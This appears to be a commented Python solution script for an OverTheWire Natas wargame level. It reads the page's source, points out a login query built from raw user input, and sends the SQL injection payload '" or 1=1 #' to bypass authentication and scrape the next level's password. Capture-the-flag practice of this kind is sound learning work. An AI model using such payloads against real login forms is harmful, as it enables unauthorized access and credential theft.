'''
In the first place we have to insert a username and a password in this page.
This looks like a SQL injection challenge. Let's see.
'''
import requests
import re

username = "natas14"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

session = requests.Session()

response = session.get(url,auth=(username,password))
print(response.text)
print("="*50)

source = "index-source.html"
response = session.get(url+source,auth=(username,password))
print(response.text)
print("="*50)

'''
Looking the index-source.html file:
The only line that we are intrested in is the follow:

$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 

And this code is BAD. As you can see, it gets the input of the user, creates a query and sends it to the database.
This is always bad because you CANNOT trust the user's input in ANY cases.
The most common trick that you can do is to use "'" or '"' to see if there a error and after you can try to inject some SQL code after that. 
'''

sql_injection = '" or 1=1 #' # Really simple SQL payload. The number sign "#" is used to end the SQL statement and make comment everything else that follows.
response = session.post(url,auth=(username,password),data={"username":sql_injection,"password":""})
password = re.findall("The password for natas15 is (.*)<br>",response.text)[0]
print("\nThe password for the next level is: " + password)
